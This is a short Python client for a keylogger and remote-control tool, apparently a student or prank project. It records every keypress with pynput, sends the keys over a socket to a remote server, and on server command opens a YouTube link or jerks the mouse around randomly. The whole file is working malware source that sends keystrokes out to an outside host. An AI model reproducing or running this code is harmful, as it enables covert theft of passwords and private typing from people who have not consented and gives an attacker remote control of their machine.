import pyautogui
from cliente import *
from pynput.keyboard import Listener
import webbrowser
import random


class Client(Cliente):
    def __init__(self):
        super().__init__()
        
    def enlace(self):
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ") #abrir enlace de youtube
    
    def captura(self,key):
        tecla=str(key)
        teclas=[]
        teclas.append(tecla)
        try:
            datos = self.socketCliente.recv(1024).decode()
            print(f"Servidor: {datos}")
            if datos == "enlace":
                self.enlace()
            if datos == "raton":
                self.raton()
            
        except:
                print(datos)
        try:
            self.socketCliente.send(str(teclas).encode())
        except:
            self.socketCliente.send("".encode())
        
    def raton(self):
        self.size = []
        for i in pyautogui.size():
            if not int:
                pass
            else:
                self.size.append(i - 1)
        
        for g in range (0,100):
            x = random.randint(0, self.size[0])
            y = random.randint(0, self.size[1])
            pyautogui.moveTo(x, y)
        
    def run(self):
        self.socketCliente.connect((self.host, self.port))
        with Listener (on_press=self.captura) as c:
            c.join()
        
if __name__ == "__main__":
    cli = Client()
    cli.run()